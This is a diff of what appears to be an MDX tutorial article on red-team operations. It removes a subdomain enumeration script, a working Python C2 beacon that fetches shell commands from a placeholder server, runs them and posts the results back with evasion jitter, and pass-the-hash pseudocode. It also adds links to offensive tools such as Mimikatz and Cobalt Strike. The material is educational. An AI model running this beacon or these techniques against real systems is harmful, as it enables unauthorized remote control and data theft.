@@ -68,79 +68,6 @@ reveal the extent of the target's internet-facing infrastructure. Public code re
 information like API keys or architectural details. Data breach databases may contain previously compromised credentials
 that could provide initial access.
 
-Here's a Python script for subdomain enumeration:
-
-```python
-import dns.resolver
-import concurrent.futures
-from typing import Set, List
-
-def check_subdomain(subdomain: str, domain: str) -> tuple[str, bool]:
-    """
-    Check if a subdomain exists for a given domain.
-
-    Args:
-        subdomain: The subdomain to check
-        domain: The base domain
-
-    Returns:
-        Tuple of (full_domain, exists)
-    """
-    full_domain = f"{subdomain}.{domain}"
-    try:
-        answers = dns.resolver.resolve(full_domain, 'A')
-        ips = [str(rdata) for rdata in answers]
-        return (full_domain, True, ips)
-    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.NoNameservers):
-        return (full_domain, False, [])
-    except Exception as e:
-        return (full_domain, False, [])
-
-def enumerate_subdomains(domain: str, wordlist: List[str]) -> Set[str]:
-    """
-    Enumerate subdomains using a wordlist.
-
-    Args:
-        domain: The target domain
-        wordlist: List of potential subdomain names
-
-    Returns:
-        Set of discovered subdomains
-    """
-    discovered = set()
-
-    print(f"[*] Enumerating subdomains for {domain}")
-    print(f"[*] Testing {len(wordlist)} potential subdomains...\n")
-
-    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
-        futures = {
-            executor.submit(check_subdomain, sub, domain): sub
-            for sub in wordlist
-        }
-
-        for future in concurrent.futures.as_completed(futures):
-            full_domain, exists, ips = future.result()
-            if exists:
-                discovered.add(full_domain)
-                print(f"[+] Found: {full_domain}")
-                for ip in ips:
-                    print(f"    └─ {ip}")
-
-    return discovered
-
-# Example usage
-if __name__ == "__main__":
-    target_domain = "example.com"
-    common_subdomains = [
-        "www", "mail", "ftp", "admin", "portal",
-        "vpn", "remote", "api", "dev", "staging",
-        "test", "prod", "app", "dashboard", "secure"
-    ]
-
-    found_subdomains = enumerate_subdomains(target_domain, common_subdomains)
-    print(f"\n[*] Total subdomains found: {len(found_subdomains)}")
-```
-
 ## Phase 2: Initial Access
 
 Once we've gathered intelligence, we need to gain initial access. The choice of attack vector depends on the target's
@@ -159,21 +86,25 @@ compromises target third-party vendors or service providers to gain indirect acc
   </FeatureCard>
 
 {" "}
+
 <FeatureCard title="Web Exploitation">
   Exploiting vulnerabilities in web applications like SQLi, XSS, or RCE to gain unauthorized access.
 </FeatureCard>
 
 {" "}
+
 <FeatureCard title="Credential Stuffing">
   Using leaked credentials from previous breaches to gain access to target systems and services.
 </FeatureCard>
 
 {" "}
+
 <FeatureCard title="Social Engineering">
   Manipulating individuals to divulge confidential information through psychological tactics.
 </FeatureCard>
 
 {" "}
+
 <FeatureCard title="Physical Access">
   Gaining unauthorized physical access to facilities or devices through tailgating or bypass techniques.
 </FeatureCard>
@@ -220,132 +151,6 @@ when network activity is highest, reducing the chance of detection through anoma
 randomized sleep intervals prevent security systems from identifying regular beacon patterns that indicate compromised
 hosts.
 
-Here's a simple C2 beacon implementation:
-
-```python
-import requests
-import time
-import random
-import subprocess
-import base64
-from typing import Optional
-
-class C2Beacon:
-    """
-    Simple C2 beacon for demonstration purposes.
-    In real scenarios, this would be much more sophisticated.
-    """
-
-    def __init__(self, c2_url: str, beacon_id: str, jitter: float = 0.3):
-        self.c2_url = c2_url
-        self.beacon_id = beacon_id
-        self.jitter = jitter
-        self.sleep_time = 60  # Base sleep time in seconds
-
-    def apply_jitter(self, base_time: int) -> int:
-        """Apply jitter to avoid predictable beacon intervals."""
-        jitter_range = base_time * self.jitter
-        return base_time + random.uniform(-jitter_range, jitter_range)
-
-    def check_in(self) -> Optional[dict]:
-        """Check in with C2 server and retrieve tasks."""
-        try:
-            headers = {
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                'X-Beacon-ID': self.beacon_id
-            }
-
-            response = requests.get(
-                f"{self.c2_url}/api/beacon/checkin",
-                headers=headers,
-                timeout=10,
-                verify=True  # In production, you'd handle cert pinning
-            )
-
-            if response.status_code == 200:
-                return response.json()
-
-        except requests.exceptions.RequestException as e:
-            # Silently fail - don't alert the blue team!
-            pass
-
-        return None
-
-    def execute_task(self, task: dict) -> str:
-        """Execute a task received from C2."""
-        command_type = task.get('type')
-        command_data = task.get('data')
-
-        if command_type == 'shell':
-            try:
-                result = subprocess.run(
-                    command_data,
-                    shell=True,
-                    capture_output=True,
-                    text=True,
-                    timeout=30
-                )
-                return base64.b64encode(result.stdout.encode()).decode()
-            except Exception as e:
-                return base64.b64encode(f"Error: {str(e)}".encode()).decode()
-
-        elif command_type == 'sleep':
-            self.sleep_time = int(command_data)
-            return "Sleep interval updated"
-
-        elif command_type == 'die':
-            return "Terminating beacon"
-
-        return "Unknown command type"
-
-    def send_results(self, task_id: str, results: str) -> bool:
-        """Send task results back to C2."""
-        try:
-            payload = {
-                'beacon_id': self.beacon_id,
-                'task_id': task_id,
-                'results': results
-            }
-
-            response = requests.post(
-                f"{self.c2_url}/api/beacon/results",
-                json=payload,
-                timeout=10
-            )
-
-            return response.status_code == 200
-
-        except requests.exceptions.RequestException:
-            return False
-
-    def run(self):
-        """Main beacon loop."""
-        print(f"[*] Beacon {self.beacon_id} starting...")
-
-        while True:
-            # Check in with C2
-            task = self.check_in()
-
-            if task:
-                # Execute task
-                results = self.execute_task(task)
-
-                # Send results
-                self.send_results(task.get('task_id'), results)
-
-                # Check if we should terminate
-                if task.get('type') == 'die':
-                    break
-
-            # Sleep with jitter
-            sleep_time = self.apply_jitter(self.sleep_time)
-            time.sleep(sleep_time)
-
-# Example (DO NOT USE IN UNAUTHORIZED TESTING)
-# beacon = C2Beacon("https://c2.example.com", "beacon-001")
-# beacon.run()
-```
-
 ## Phase 4: Privilege Escalation
 
 After establishing access, we typically need elevated privileges. Common Windows privilege escalation techniques:
@@ -386,59 +191,6 @@ graph TB
 
 `} />
 
-### Pass-the-Hash Attack
-
-Here's a simplified explanation of Pass-the-Hash:
-
-```python
-"""
-Pass-the-Hash (PtH) Attack Simulation
-Note: This is educational pseudocode, not a working exploit
-"""
-
-def pass_the_hash_attack(target_ip: str, username: str, ntlm_hash: str):
-    """
-    Simulate a Pass-the-Hash attack.
-
-    In a real PtH attack:
-    1. Extract NTLM hash from compromised system (e.g., using Mimikatz)
-    2. Use hash directly for authentication (no need to crack password)
-    3. Authenticate to remote systems using the hash
-    """
-
-    # Step 1: Format the hash
-    lm_hash = "aad3b435b51404eeaad3b435b51404ee"  # Empty LM hash
-    nt_hash = ntlm_hash
-
-    # Step 2: Create NTLM authentication
-    # (In reality, this involves complex NTLM protocol implementation)
-    print(f"[*] Attempting PtH attack on {target_ip}")
-    print(f"[*] Username: {username}")
-    print(f"[*] NTLM Hash: {nt_hash}")
-
-    # Step 3: Authenticate using hash (pseudocode)
-    """
-    from impacket.smbconnection import SMBConnection
-
-    conn = SMBConnection(target_ip, target_ip)
-    conn.login(username, '', lmhash=lm_hash, nthash=nt_hash)
-
-    if conn.isGuestSession():
-        print("[-] Authentication failed")
-    else:
-        print("[+] Successfully authenticated!")
-        # Now you can execute commands, access shares, etc.
-    """
-
-    return "Educational demonstration only"
-
-# Real-world tools for PtH:
-# - Mimikatz
-# - Impacket
-# - CrackMapExec
-# - Metasploit
-```
-
 ## Red Team vs Blue Team
 
 Understanding both sides makes you a better security professional. Red teams simulate real attackers to find
@@ -451,18 +203,26 @@ and blue teams creates a feedback loop that strengthens overall security posture
 
 ## Essential Red Team Tools
 
-Professional red teamers rely on a curated toolset covering every phase of an engagement. Reconnaissance tools like Nmap
-provide network scanning and service detection, while Masscan offers high-speed port scanning capabilities. Amass excels
-at subdomain enumeration, and theHarvester automates OSINT gathering from multiple sources. For initial access,
-Metasploit provides a comprehensive exploitation framework, and Cobalt Strike offers commercial C2 capabilities with
-advanced evasion features. Gophish enables realistic phishing campaign simulations, while SET (Social Engineering
-Toolkit) automates various social engineering attacks.
+Professional red teamers rely on a curated toolset covering every phase of an engagement. Reconnaissance tools like
+[Nmap](https://nmap.org/) provide network scanning and service detection, while
+[Masscan](https://github.com/robertdavidgraham/masscan) offers high-speed port scanning capabilities.
+[Amass](https://owasp.org/www-project-amass/) excels at subdomain enumeration, and
+[theHarvester](https://github.com/laramies/theHarvester) automates OSINT gathering from multiple sources. For initial
+access, [Metasploit](https://www.metasploit.com/) provides a comprehensive exploitation framework, and
+[Cobalt Strike](https://www.cobaltstrike.com/) offers commercial C2 capabilities with advanced evasion features.
+[Gophish](https://getgophish.com/) enables realistic phishing campaign simulations, while
+[SET (Social Engineering Toolkit)](https://trustedsec.com/resources/tools/the-social-engineer-toolkit-set) automates
+various social engineering attacks.
 
-Post-exploitation tools become critical after gaining initial access. Mimikatz extracts credentials from Windows
-systems, BloodHound visualizes Active Directory attack paths, and PowerSploit provides PowerShell-based
-post-exploitation modules. Empire offers both PowerShell and Python post-exploitation capabilities with a user-friendly
-interface. For maintaining persistence, SharPersist provides a Windows persistence toolkit, Impacket implements network
-protocols for lateral movement, and Covenant offers a .NET-based C2 framework with strong operational security features.
+Post-exploitation tools become critical after gaining initial access. [Mimikatz](https://blog.gentilkiwi.com/mimikatz)
+extracts credentials from Windows systems, [BloodHound](https://bloodhound.specterops.io/get-started/introduction)
+visualizes Active Directory attack paths, and [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) provides
+PowerShell-based post-exploitation modules. [Empire](https://www.powershellempire.com/?page_id=110) offers both
+PowerShell and Python post-exploitation capabilities with a user-friendly interface. For maintaining persistence,
+[SharPersist](https://github.com/mandiant/SharPersist) provides a Windows persistence toolkit,
+[Impacket](https://github.com/fortra/impacket) implements network protocols for lateral movement, and
+[Covenant](https://github.com/cobbr/Covenant) offers a .NET-based C2 framework with strong operational security
+features.
 
 ## Best Practices for Red Team Operations
 
@@ -492,7 +252,9 @@ face.
 
 ### Further Reading
 
-The MITRE ATT&CK Framework provides comprehensive documentation of adversary tactics and techniques observed in
-real-world attacks. Red Team Development and Operations offers practical guidance for conducting professional
-engagements. The Awesome Red Teaming repository curates tools, resources, and learning materials. The Red Teaming
-Handbook covers practical aspects of planning and executing engagements from initial scoping through final reporting.
+The [MITRE ATT&CK Framework](https://attack.mitre.org/) provides comprehensive documentation of adversary tactics and
+techniques observed in real-world attacks. Red Team Development and Operations offers practical guidance for conducting
+professional engagements. The [Awesome Red Teaming](https://github.com/ebalo55/awesome-offensive-rust) repository
+curates tools, resources, and learning materials. The
+[Red Teaming Handbook](https://assets.publishing.service.gov.uk/media/61702155e90e07197867eb93/20210625-Red_Teaming_Handbook.pdf)
+covers practical aspects of planning and executing engagements from initial scoping through final reporting.
